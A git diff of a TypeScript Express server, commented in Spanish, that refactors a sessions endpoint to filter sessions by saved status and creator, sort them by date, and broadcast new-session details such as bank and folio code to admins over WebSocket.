@@ -570,25 +570,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const { type = 'current' } = req.query;
       const user = req.user;
       console.log(`[Sessions] Usuario ${user.username} solicitando sesiones, tipo: ${type}, rol: ${user.role}`);
-
+      
+      // Obtenemos todas las sesiones para que estén siempre actualizadas
+      const allSessions = await storage.getAllSessions();
+      
+      // Filtramos según el tipo solicitado
       let sessions;
       if (type === 'saved') {
-        // Para depuración, vamos a registrar todas las sesiones guardadas
-        const allSaved = await storage.getSavedSessions(); 
-        
-        // Primero registramos información detallada de cada sesión guardada
-        console.log(`[Sessions] Hay ${allSaved.length} sesiones guardadas en total:`);
-        allSaved.forEach(s => {
-          console.log(`- Sesión ${s.sessionId}: creador=${s.createdBy || 'desconocido'}, saved=${s.saved}, banco=${s.banco}`);
-        });
-        
-        sessions = allSaved;
+        sessions = allSessions.filter(s => s.saved === true);
+        console.log(`[Sessions] Hay ${sessions.length} sesiones guardadas filtradas de ${allSessions.length} totales`);
       } else if (type === 'all') {
-        sessions = await storage.getAllSessions();
+        sessions = allSessions;
         console.log(`[Sessions] Obtenidas ${sessions.length} sesiones (todas)`);
       } else {
-        sessions = await storage.getCurrentSessions();
-        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones actuales`);
+        // Sesiones que no están guardadas (current)
+        sessions = allSessions.filter(s => !s.saved);
+        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones actuales filtradas de ${allSessions.length} totales`);
       }
       
       // Filtrando las sesiones según el usuario
@@ -597,31 +594,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (!isSuperAdmin) {
         const beforeCount = sessions.length;
         
-        // Para depuración, intentaremos encontrar las sesiones generadas específicamente por brandon
-        const userSessions = sessions.filter(session => session.createdBy === user.username);
-        console.log(`[Debug] Encontradas ${userSessions.length} sesiones con creador '${user.username}'`);
-        
         // Verificar explícitamente la existencia del campo createdBy para cada sesión
-        console.log(`[Debug] Estado de createdBy en todas las sesiones:`);
         sessions.forEach((session, index) => {
-          console.log(`[${index}] Sesión ${session.sessionId}: createdBy = ${session.createdBy || 'UNDEFINED'}`);
+          if (!session.createdBy) {
+            console.log(`[Alert] Sesión ${session.sessionId} sin creador asignado.`);
+          }
         });
         
-        // Utilizamos el filtro normal
-        sessions = sessions.filter(session => {
-          const isCreatedByCurrentUser = session.createdBy === user.username;
-          
-          if (!isCreatedByCurrentUser && session.createdBy) {
-            console.log(`Sesión ${session.sessionId} no mostrada a ${user.username}, creador: ${session.createdBy}`);
-          }
-          
-          return isCreatedByCurrentUser;
-        });
+        // Filtrar solo las sesiones creadas por este usuario
+        sessions = sessions.filter(session => session.createdBy === user.username);
         
         console.log(`[Sessions] Usuario ${user.username} (rol: ${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
       } else {
         console.log(`[Sessions] Superadministrador balonx accediendo a todas las sesiones (${sessions.length})`);
       }
+      
+      // Ordenamos por fecha más reciente primero
+      sessions.sort((a, b) => {
+        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0;
+        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0;
+        return dateB - dateA;
+      });
 
       res.json(sessions);
     } catch (error) {
@@ -845,6 +838,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
         type: 'SESSIONS_UPDATED',
         data: {
           userName: user.username
+        }
+      }));
+
+      // Enviar una señal específica a través de WebSocket para actualizar las sesiones del usuario
+      // con información completa sobre la nueva sesión
+      broadcastToAdmins(JSON.stringify({
+        type: 'SESSION_UPDATE',
+        data: {
+          sessionId,
+          banco: banco as string,
+          folio: sixDigitCode,
+          pasoActual: ScreenType.FOLIO,
+          createdBy: user.username,
+          saved: false,
+          createdAt: new Date().toISOString()
         }
       }));
 
